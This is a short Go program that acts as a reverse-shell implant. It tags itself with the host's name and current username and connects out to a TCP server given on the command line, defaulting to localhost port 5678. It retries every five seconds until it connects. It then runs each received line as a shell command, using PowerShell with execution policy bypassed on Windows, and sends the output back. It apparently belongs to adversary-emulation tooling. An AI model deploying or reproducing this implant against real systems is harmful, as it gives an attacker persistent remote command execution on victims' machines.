package main

import (
   "bufio"
   "fmt"
   "net"
   "os/exec"
   "strings"
   "os"
   "os/user"
   "time"
   "runtime"
)

// Execute runs a shell command
func execute(command string) ([]byte, error) {
	if runtime.GOOS == "windows" {
		return exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).CombinedOutput()
	} 
	return exec.Command("sh", "-c", command).CombinedOutput()
}

func push(conn net.Conn) {
   for {
      message, _ := bufio.NewReader(conn).ReadString('\n')
      if len(message) == 0 {
         break
      }
      message = strings.TrimSuffix(string(message), "\n")
      message = strings.TrimSpace(message)

      if strings.HasPrefix(message, "cd") {
         pieces := strings.Split(message, "cd")
         os.Chdir(strings.TrimSpace(pieces[1]))
         conn.Write([]byte(" "))
      } else {
         output, err := execute(message)
         if err != nil {
            conn.Write([]byte(string(err.Error())))
         }
         conn.Write([]byte(output))
      }
   }
}

func main() {
   host, _ := os.Hostname()
   user, _ := user.Current()
   paw := fmt.Sprintf("%s$%s", host, user.Username)

   server := "127.0.0.1:5678"
   if len(os.Args) == 2 {
      server = os.Args[1]
   }
   for {
      conn, err := net.Dial("tcp", server)
      if err != nil {
         fmt.Println(err)
         time.Sleep(5 * time.Second)
         continue
      }
      conn.Write([]byte(paw))
      push(conn)
   }
}